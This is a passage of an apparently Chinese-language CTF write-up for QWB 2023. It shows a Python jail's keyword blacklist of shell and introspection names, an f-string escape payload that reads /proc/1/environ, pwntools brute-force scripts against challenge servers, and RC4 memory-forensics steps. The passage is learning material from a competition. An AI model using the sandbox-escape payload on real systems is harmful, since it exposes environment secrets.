= blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br><span class="hljs-built_in">__import__</span> = blacklist_fun_callback<br><span class="hljs-built_in">compile</span> = blacklist_fun_callback<br><span class="hljs-built_in">breakpoint</span> = blacklist_fun_callback<br><br><span class="hljs-keyword">del</span> os, subprocess, code, pty, blacklist_fun_callback<br>input_code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br><br>blacklist_words = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_filter</span>(<span class="hljs-params">input_code</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> input_code.isascii() <span class="hljs-keyword">and</span> my_filter(input_code) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(input_code) &lt; <span class="hljs-number">65</span>:<br>    input_code = <span class="hljs-built_in">eval</span>(<span class="hljs-string">f&quot;f&#x27;<span class="hljs-subst">&#123;input_code&#125;</span>&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>限制了payload长度小于65<br>过滤了很多<br><code>Print</code> 和 <code>open</code>、<code>read</code> 没过滤，可以配合读文件并打印<br>读取当前进程的环境变量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&#123;print(open(<span class="hljs-string">&quot;/proc/1/environ&quot;</span>).read())&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/qwb2023/5.png"></p><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>一个个遍历9位字符<br>返回的0代表该位字符不对，1则代表该位字符正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;error&#x27;</span><br>a = <span class="hljs-number">9</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_string</span>(<span class="hljs-params">data</span>):<br>    r = remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12199</span>)  <span class="hljs-comment"># 远程服务器的地址和端口号，替换为实际值</span><br>    r.recvuntil(<span class="hljs-string">b&quot;Enter a string (should be less than 10 bytes): &quot;</span>)  <span class="hljs-comment"># 接收并丢弃直到遇到指定字符串的输入</span><br>    r.sendline(data)  <span class="hljs-comment"># 发送数据到服务器</span><br>    result = r.recvline().decode().strip()  <span class="hljs-comment"># 接收服务器回传的数据</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(result)<br>        os.system(exit)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sent:&quot;</span>, data)  <span class="hljs-comment"># 打印发送的数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received:&quot;</span>, result)  <span class="hljs-comment"># 打印接收到的数据</span><br>    r.close()  <span class="hljs-comment"># 关闭与服务器的连接</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_correct_string</span>(<span class="hljs-params">current_string, position</span>):<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> a<br>    charset = string.digits + string.ascii_letters  <span class="hljs-comment"># 可能字符的集合，digits 是数字，ascii_letters 是字母</span><br><br>    <span class="hljs-keyword">if</span> position == <span class="hljs-number">9</span>:  <span class="hljs-comment"># 达到字符串的长度上限</span><br>        result = send_string(current_string)  <span class="hljs-comment"># 发送当前字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>:  <span class="hljs-comment"># 如果结果的最后一个字符是 &#x27;1&#x27;，表示字符串是正确的</span><br>            <span class="hljs-keyword">return</span> current_string<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> charset:  <span class="hljs-comment"># 遍历可能的字符集合</span><br>        test_string = ( flag + c +<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(flag))).encode()  <span class="hljs-comment"># 组合测试字符串，将未使用的位置填充为 &#x27;0&#x27;</span><br>        result = send_string(test_string)  <span class="hljs-comment"># 发送测试字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))] == <span class="hljs-string">&#x27;1&#x27;</span>: <br>            flag = flag + <span class="hljs-built_in">chr</span>(test_string[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))])<br>            <span class="hljs-built_in">print</span>(flag)<br>            recursive_result = find_correct_string(test_string.decode(), position+<span class="hljs-number">1</span>)  <span class="hljs-comment"># 递归调用，继续验证下一个字符位置</span><br>            <span class="hljs-keyword">if</span> recursive_result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 如果递归结果不为空，表示找到了正确的字符串</span><br>                <span class="hljs-keyword">return</span> recursive_result<br>          <br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 如果在所有可能的字符中都未找到正确的字符串，则返回 None</span><br><br>correct_string = find_correct_string(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 从空字符串开始验证</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct string:&quot;</span>, correct_string)  <span class="hljs-comment"># 打印正确的字符串</span><br></code></pre></td></tr></table></figure><p><code>00qwbGood</code><br><img src="/mdimg/qwb2023/6.png"></p><h3 id="Happy-Chess"><a href="#Happy-Chess" class="headerlink" title="Happy Chess"></a>Happy Chess</h3><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>每轮输入<code>1 1</code>时观察靶机返回值，怀疑存在逻辑漏洞<br>然后每轮输入<code>1 1</code> 来循环最后以<code>exit</code>结束对局并开启下一局，循环10轮后就拿到了flag<br><img src="/mdimg/qwb2023/7.png"></p><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆破求解 发现机器出拳在前面出拳顺序相同的情况下始终不变 </span><br><span class="hljs-comment"># 每轮剪刀石头布都尝试一次</span><br><span class="hljs-comment"># 获胜则记录下出拳, 用于下一次的求解</span><br><span class="hljs-comment"># 运行爆破后再手动将输出结果粘贴到success函数</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span><br><br>link = <span class="hljs-string">&#x27;nc 8.147.129.191 42289&#x27;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br><br>winning_strategy = []<br><br><span class="hljs-comment"># while len(winning_strategy) &lt; 100:</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">0</span>:<br>    p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    p.recv()<br>    <span class="hljs-comment"># out = (p.recv().decode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    <span class="hljs-comment"># out = p.recvuntil(&#x27;你的分数：&#x27;.encode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>    <span class="hljs-comment"># print(p.recvuntil(b&#x27;-----------------------------------&#x27;,drop=1),end=&#x27;\t&#x27;)</span><br>    <span class="hljs-comment"># print(out)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>        out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>        <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&#x27;\t&#x27;</span>)<br>        <span class="hljs-comment"># print(out)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;你赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            winning_strategy.append(i)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;平局&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;Me10n赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] pass&#x27;</span>)<br>        p.close()<br>        p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>            p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    <span class="hljs-comment"># print(out.decode(encoding=&#x27;utf8&#x27;, errors=&#x27;ignore&#x27;))</span><br>    p.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(winning_strategy), winning_strategy)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>():<br>    win = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> win:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br><br>success()<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="SpeedUp"><a href="#SpeedUp" class="headerlink" title="SpeedUp"></a>SpeedUp</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>https://oeis.org/A244060/list</code><br><img src="/mdimg/qwb2023/8.png"></p><h3 id="找到PNG了吗"><a href="#找到PNG了吗" class="headerlink" title="找到PNG了吗"></a>找到PNG了吗</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>不太会Linux内存取证，用R-studio看了一下，没找到啥有用的东西，直接Strings 找到PNG了吗.mem（这个过程要耗一点时间，文件太大了）<br>然后在字符串中翻看到一处加密程序<br><img src="/mdimg/qwb2023/9.png"><br>主要加密函数如下，根据 rc4_encrypt_decrypt可以看出这是一个对文件进行RC4加密的程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> q[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;do_not_care&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key2[] = <span class="hljs-string">&quot;where_is_the_key&quot;</span>;<br>    FILE* file = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;have_your_fun.jocker&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open file failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *str;<br>    str = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">memcpy</span>(str, buff, <span class="hljs-number">20000</span>);<br><span class="hljs-built_in">rc4_encrypt_decrypt</span>(key2, str, <span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please give me the key of fun:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,q);<br>    <span class="hljs-built_in">rc4_encrypt_decrypt</span>(key, str, <span class="hljs-number">20000</span>);<br>    <br>    <span class="hljs-built_in">fwrite</span>(buff, <span class="hljs-number">1</span>, <span class="hljs-number">20000</span>, file);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;maybe you go wrong&quot;</span>);<br>    <span class="hljs-built_in">fclose</span>(file);<br>    <span class="hljs-built_in">close</span>(clientSocket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>再根据题目信息猜测这个加密程序对发送的png图片做了处理，所以我们逆向思维去找加密后的png图片，以png文件头为特征值RC4加密得到，新的文件头0e 3c b4 2f 99 96 95 56<br><img src="/mdimg/qwb2023/10.png"><br><img src="/mdimg/qwb2023/11.png"><br>往下翻，看到一些无效数据，所以在这里下断点，将上面的hex数据另存为文件，再用赛博厨子解密即可<br><img src="/mdimg/qwb2023/12.png"><br><a href="https://cyberchef.cn/#recipe=To_Hex('Space',0)RC4(%7B'option':'UTF8','string':'do_not_care'%7D,'Hex','Latin1')To_Hex('Space',0/disabled)Render_Image('Raw')&input=Djy0L5mWlVa%2Ba%2B/pQkhdGNUXemfs8DMUX0aar/xADCXQusOwoIskPQRXYX3sfWfZidGPJ1uM4Tk13pVKniN23LZXVSm7ZIGfFniwZwHKUxr%2B%2Bj0YkHCzR3BeQnszEuY/HCRN/mCwxzKm6NBbVj6SXUhMscmko8ugK7FhejOTl9ktAGE9NEcw/xWJVeXVA5nR9hVn13gAH9PDOHzgrnxFhARF64giI4Ou%2B6ROhmWuZMpGKt4LespSJNqj0r9XTrYVrWpF1qn9NXdC3GCO1NSd4Y7NtJFBWAzlMuXxIM5i3z64cLkspdQR0qRi33W5QvzE4KBt4%2Bp0u4Zwvl4RaMW3UGwA2lBrrjzOTMA%2Bbd4be7mru04srcktpuBuVkDGb6KJAXO74qu1QMx2wPFY2td5ohJtD4IZbsFp9G9oyYDg42IbaOSlPWxelCKDz0cZAqlzt6vEkbidlBsyoWyoi8hIYr2k%2BaZ8t8dpFHPBCg0C1a1xtnb5Myjr99vDQfNUVfJ7K1rlWLxw3ulb0M4dIde4SwlNsUjM0CMYOIWBlQHPFqNjSXQNoETanSap0%2Bkf2Ncblh5E6Z81Cd9AEE7NV4FIbyeKlLaFEhrUdBf0%2BGXG7LZs2bWsTW1zPG2H2CYndxh9SuNUyjJYmPhcr88yk65ePanzQdyAg9y3XJM8L4zry4YEAnfum%2BVdxXDT0C1yqJUUI1Ywmfy6yMjzaLwDeJmJiQJ93rT8y7kqnjki1uvDK%2BEl6BzMr3OWeGKlbci%2BdAPamVTscJsmWYHCRQgdP/U9FiJED5g05YFC6PJvR92gNpspbf8UcPkN4WstbLbmMYBx4Z/gVB%2BQhTSY0uAKge9gnBZtnmu5a2NQwapC9GFJVJ9kmWXW3kylTLCH69PDg9A4GOvCY7vjhL5DH%2BZWU7yTayn%2BPPYpksB98mgP1VcCQzk79xVcs8edOCcSAo4vNypAFYN4lMni%2BhvG3mo7xBwWdU1Wdd00xzyHyAAbpTgjgXpAvNh9luxmhzz31%2BQP9SnZitm1cqxIsFuokZzwA7RAbNYd14/CHRS3Y4TJ6Tb8IuiDqa2ERGh9GBMD6CYfOfVzH0sRrCG2X9l5Cz/8ZhG367j6ufk3ynT2RQlzkKz7kd/rU1o8fK0nIa2Mgm%2BHndMvfLF/hE85C1D0Dg3pEVOUJ4xt72Q10s%2BorlbGtNt6qLo%2BmlBasagWqffqp%2B0qFg%2BagkHu1d8/UEhOapAw3qtWd6iQ5c0kXRYeGfGJwJjkURuHTOMPxnN6anxqrp47GqKSU8DVjuCGnSbG%2BsMTygEMaaV/EfFhh/rJPckMLVuBvOjO49KsW6AoVkIji8ICEuDVQZE1o99p2hgTU7q91i/c0zdzYz8u%2BzVNo/A3znyPUrHO68mU47TzfD8s2tMGJW7%2BYHAnkR0D%2BD1f82tmchEtJmbt2bHBkEhNyU/MtFZ/h2LzeVBWdFXmDTRQVSunO5R7HkwwkH5Ao9PyhmfvO1N0aspxpKRykS1fv8GryvNwNm/z02x9mYt0HKPZVHMpsfrGomRXfV8%2BKQR5Jj%2BRExJJ4rD3CZpeOdwtCYY7cxHeWMNPdt8/8Y0CXMC0zKltpwF8D5jjVoqdMbaCxLkXlWxBiPUOTfIDKAOtd798t%2BDsvjV8fR6yCID3L4s1BV8%2B5/c6Oarc/1oh%2Bj65PbzeWJjrJHa4Ve18S0S/HZECA%2BhV6X37HW69TFSVGpJwes%2Bj0PM4Gj0MwHiE1WgVGzHk3oyQG015mTJkvgz0V8nQpA6%2BFHqHalh2YCR2gYJxLIBzVI/7iMzdQZVdsbZsPnLE9StlQfymRE1725udSzL%2BP8MXy5pyEJDHOLnhSamNywH0C8NaS/gwsziqwg3WyHH8pgJJ2iwPE/G6SjhWTO5f84iO10kAFeAo%2B0pbRSgxR4w04pflggZ6bVPJOP0VfmkalUVfI7ACsmPuiWSzA3ORRlKPOSDGAZR7/6t0trA/WiCS1fj9PoirpojrwWBj9EiAZstv2k7YeVk9T1qn4zXShqzpVlJA8H04AIThB5tMDVJb9CPZ%2Be3OAxmoF3ACWJaHNOz7U1TAgb25mvvYlL0VvuCAzEinFtW/exXt8aYeO0i4BAEmRLemzJSRNxl4100u3lqvGOgUvi8L%2BBOEh8X3fZnEgpbH8PFVrX%2BerZFH%2BXr3NavkhwJVJTAj0xt7c4V6V14iHLrItQSOtR0dSL8KY0pn9xFsAqIUehfjFOW6mGq8ZIAnbGopoqHGBNGfJj5QTMBsSG2WaxE4aBSIW7QiFy7E/5mHB23MM%2BKOLwXAHJIVU7eCdt/Cbvz412fZN0vL2et8hqlVXysZ4s4U6WHoMtm%2B6F7VpNB69NNgsmwoefLfOF3KF/ROsWgcee%2BJtHQ73SF9gG6tBV%2BcnkQa4FySWUVhGA9Sj3P2YBszCc01icoT1GoA3qtoAisVgzpLK00BjwNGfM3jrYdfFB4RK0aoapH1FNW8dS6bJ1UPWDUOj5Xfm0ucrqD0jxUdGbZrplg0M%2BgX4l9kIMXCwGfhaY%2Bo5IqAmmLaKvROgNo6n5DsgwEApK13o7k8EikxEbgw/Q5CFH28bpD/g6r3/jp0jlV65T2QgJx2ThzNNPntbd9oOZMcv4gJN%2BYSQ0tP4mKLyO15SbQVI1X0ND2aDqnhKv8Vw0mydEZMQOZUe11NERYJ7cAGBkL8gbNLNKcG6m1ZExBD/jp8ezd1a4rkaxY3S9zrHBJ80GnS%2BG%2BsqtYEVJ5MjvPIII9qJtoOk%2BWl1sF9XcBm/PI2HvZv/KHovD/3dr1OdLu6Dqf6EnJhfA92UwDj/VOAwGYxtt2l7gNeJ4lhT8mWm4jJe2UKW8nhGOeOgfhpPCkr7pt6GS8s%2Bubgx0lqrzM2f2Py9t5riRRGIXNROLBRWQvyn/42Kme8ql6%2B67fTliyxwY42E7OS1QEdtA6/Ys/HJWs9QZ7RMDGNtBY3%2BLwGy5NV92DzVPmycKCB4LhvRt1zfv1WVM/uWEYmqq5SVSbmR8AMW5lTT2WHMfnEhXj5leW17j/aQg5wmFX5kl8NTodyZ7OtesXKnP1dNIp%2BnJMhnm0dOqr/cK4XvbcoHcnAurnySVjAAO/tP3wRcp2K4IArX7QCkbLr92eFaX0TP%2BvVjmwYM9JTXNyBcfUu%2BcLIWGrUfQ0nQ0VeSgn0w96usmb6vXrDByWEKwfgl5dsUPBPKEttmPFAulPQpbs0ikCWRh23QYM9nr3aB66PNeHoE%2BjKQsQTUhVQUoJ9J7pukRyldlT//JxZylrKZcfYrgJtPDtjE%2BBFRq%2BbUjifVHeX2ejJW%2BvQJmsdAKOjdPzxKpjv/8D37LNEIImgnWWx14Yo